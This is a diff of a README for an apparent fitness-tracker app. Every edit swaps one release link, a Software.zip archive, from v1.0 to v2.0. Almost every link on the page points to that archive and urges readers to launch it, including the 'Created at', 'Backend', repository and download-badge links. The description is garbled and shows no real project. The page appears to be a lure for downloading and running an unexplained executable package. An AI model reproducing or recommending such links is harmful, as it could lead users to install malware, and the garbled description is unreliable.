@@ -1,6 +1,6 @@
 # 🏋️‍♂️ FitCrew Fitness Tracker 🏃‍♀️
 
-Welcome to the **FitCrew Fitness Tracker** repository! Keep track of your fitness goals, monitor your progress, and share your achievements with friends using this awesome fitness tracking app. Created at [https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip), this application combines the power of backend development, frontend design, and machine learning to help you stay on top of your health and fitness journey.
+Welcome to the **FitCrew Fitness Tracker** repository! Keep track of your fitness goals, monitor your progress, and share your achievements with friends using this awesome fitness tracking app. Created at [https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip), this application combines the power of backend development, frontend design, and machine learning to help you stay on top of your health and fitness journey.
 
 ## 🚀 Features
 - **Achievement Sharing**: Share your fitness milestones with friends and inspire each other to reach new heights.
@@ -10,7 +10,7 @@ Welcome to the **FitCrew Fitness Tracker** repository! Keep track of your fitnes
 - **Workout App**: Access workout routines, exercise guides, and fitness tips to enhance your training experience.
 
 ## 🛠️ Technologies Used
-- **Backend**: https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip, https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip
+- **Backend**: https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip, https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip
 - **Frontend**: React
 - **Developer Tools**: npm
 - **Code Generation**: Automated code generation tools
@@ -19,7 +19,7 @@ Welcome to the **FitCrew Fitness Tracker** repository! Keep track of your fitnes
 - **Health App**: Build features specifically tailored for health and fitness tracking
 
 ## 📂 Repository Content
-You can access the software package containing all the necessary files and resources by [clicking here](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip). ⚙️ Launch the package to get started with the FitCrew Fitness Tracker app!
+You can access the software package containing all the necessary files and resources by [clicking here](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip). ⚙️ Launch the package to get started with the FitCrew Fitness Tracker app!
 
 ## 🌟 Get Started
 1. Clone the repository to your local machine.
@@ -37,6 +37,6 @@ For any inquiries or feedback, you can reach out to the project maintainers thro
 
 <!-- You can add additional sections like FAQ, Troubleshooting, or Support as needed -->
 
-[Click here to visit the repository!](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip)
+[Click here to visit the repository!](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip)
 
-[![Download Software](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip)](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip)](https://github.com/hernamarvin1/fitcrew-fitness-tracker/releases/download/v2.0/Software.zip)
